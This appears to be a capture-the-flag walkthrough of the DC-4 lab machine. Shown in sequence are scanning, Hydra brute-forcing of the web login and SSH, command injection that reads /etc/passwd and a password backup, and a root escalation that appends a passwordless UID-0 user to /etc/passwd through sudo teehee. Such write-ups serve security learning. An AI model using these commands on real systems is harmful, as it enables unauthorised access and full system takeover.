
`nmap -sn 192.168.56.112 
`nmap -A -p- 192.168.56.112

we see port 22 ssh and port 80 http is open 
then we log into the website
look for the sybdirectories using `dirb http://192.168.56.112/`  but it didnt help

### **Exploiting**


`hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout"`

target http://dc-4/index.php

`hydra -l admin -P /usr/share/wordlists/rockyou.txt dc-4 http-post-form "/index.php:username=^USER^&password=^PASS^:S=logout" -V`

After many failed attempts on guessing or sql injection, I used Burp to Brute-Force the login page as it seems nothing has been working I captured the Request and Sent it to Intruder
brute forced the password for admin and fount it was ==happy==
then i logged into the website
after roaming around these i found a POST request and edited that through burp
We can see the Raw request with Burp



### Why `+` is used

When data is sent through an HTTP GET request, a **space** is often encoded as a `+`.

For example, if you type:

```
ls /home
```

the browser may send it as:

```
ls+/home
```

The web server decodes the `+` back into a space before executing the command.

So:

```
ls+/home
```

becomes:

```
ls /home
```



![[Pasted image 20260725131950.png]]

changed the commad to `ls+/home` and found some usernames ==jim,sam==

![[Pasted image 20260725132035.png]]

Exploring the home directory for user Jimand found a ==backups folder== `ls+/home/jim`

![[Pasted image 20260725132134.png]]

then explored the backup folder using `ls+/home/jim/backups` We have found a ==old-passwords.bak== file is a backup password file

Exploring the contents of the `cat+/home/jim/backups/old-passwords.bak` we found a list of passwords. They might come in handy later 
then checking `cat+/etc/passwd`  i found some useful usernames ==charles,jim,sam==

then i created two files **user.txt & password.txt** including the findings and brute forced for sshlogin using **hydra**  `hydra -L users.txt -P password.txt 192.168.56.112 ssh`  and found credentials 

Username- jim
Password- jibril04

then i logged in  `ssh jim@192.168.56.112` 

```bash
┌──(kali㉿hashi)-[~]
└─$ ssh jim@dc-4            
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jim@dc-4's password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Mon Aug 31 21:18:14 2026 from 192.168.56.102

```

this hints me i have  a mail so i go check my mails in /var/mail
ls
when I open **mbox** , I saw a test mail in this, send by root to jim.After i checked the ==/var/mail== folder and  We have found some credentials.

Username- Charles
Password- ^xHhA&hvim0y

### **Privilege Escalation**


Let’s login into **charles** with password **^xHhA&hvim0y.**

`su charles

After enumeration, we check sudo right for Charles `sudo -l` and  found that he run the editor teehee as root with no password. 
```
sudo -l 

`User charles may run the following commands:

`(root) NOPASSWD: /usr/bin/teehee
```


normally /etc/passswd required permission


```/etc/passwd
root:x:0:0:root:/root:/bin/bash
charles:x:1001:1001::/home/charles:/bin/bash
```

Each line has fields separated by `:`:

==username : password : UID : GID : comment : home : shell==

```
sudo teehee
```

runs teehee as root.

Therefore it has permission to modify:

```
/etc/passwd
```

then we create a root user as **raaj**.Linux does not actually identify users by their names. It identifies them by their **UID**.Normally a root UID  GID looks like ==root:x:0:0== so we set it to ==0==

```

echo "raaj::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

The user gets a normal bash shell.

Logging into raaj as root user and inside the root directory, we have found our FINAL FLAG.

su raaj
cd /root
ls
cat flag.txt




standard input-0
standard output-1
standard error-2